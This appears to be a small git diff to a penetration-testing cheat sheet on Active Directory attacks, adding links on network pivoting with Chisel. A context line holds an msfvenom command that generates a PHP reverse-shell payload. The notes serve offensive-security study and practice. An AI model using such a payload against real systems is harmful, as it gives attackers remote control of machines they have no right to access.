@@ -9,6 +9,7 @@
 - https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
 - https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/
 - https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
+- https://notes.benheater.com/books/network-pivoting/page/penetrating-networks-via-chisel-proxies
 
 # Table of Content
 - [Active Directory Pentesting](#active-directory-pentesting)
@@ -394,6 +395,7 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 
 ## Pivoting for lateral movement
 ### https://blog.mkiesel.ch/posts/oscp_pivoting/
+### https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot
 #### Using Chisel
 
 ```bash
